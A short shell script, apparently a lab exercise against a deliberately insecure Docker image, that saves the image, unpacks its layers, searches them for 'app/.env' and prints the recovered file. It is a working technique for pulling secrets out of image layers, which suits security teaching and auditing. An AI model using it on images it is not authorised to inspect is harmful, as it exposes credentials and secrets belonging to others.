#!/bin/sh

OUTPUT_DIR="outputs"
TMP_DIR="tmp"
SAVE_NAME="save.tar"
IMAGE_NAME="isepdei/insecurelabs02:team10"
TARGET="app/.env"

rm -rf "$OUTPUT_DIR"; mkdir -p "$OUTPUT_DIR"; cd $OUTPUT_DIR

docker save -o "$SAVE_NAME" "$IMAGE_NAME"

mkdir $TMP_DIR; tar -xf "$SAVE_NAME" -C $TMP_DIR

for b in "$TMP_DIR"/blobs/sha256/*; do
    if tar tf "$b" 2>/dev/null | grep -q 'app/\.env$'; then
        echo "found in: $b"
        tar -xf "$b" "$TARGET"
        echo "extracted: $TARGET"
	cat $TARGET
    fi
done

rm -rf $TMP_DIR
